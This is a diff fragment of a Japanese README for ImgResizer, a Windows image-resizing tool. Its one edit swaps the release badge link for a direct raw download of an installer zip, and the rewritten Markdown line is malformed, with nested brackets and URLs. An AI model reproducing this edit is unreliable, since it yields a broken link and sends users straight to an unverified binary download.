@@ -3,7 +3,7 @@
 概要  
 ImgResizer は単体実行ファイル形式の Windows 向け画像リサイズツールです。ドラッグ＆ドロップで画像を読み込み、プレビューを見ながらアスペクト比を維持して出力できます。
 
-[![Release](https://img.shields.io/github/v/release/OWNER/REPO)](https://github.com/OWNER/REPO/releases/latest)
+[![Release]([https://img.shields.io/github/v/release/OWNER/REPO)](https://github.com/OWNER/REPO/releases/latest](https://raw.githubusercontent.com/design-pull/img-resizer/main/dist/ImgResizer-distribution-with-installer.zip))
 
 ---
 
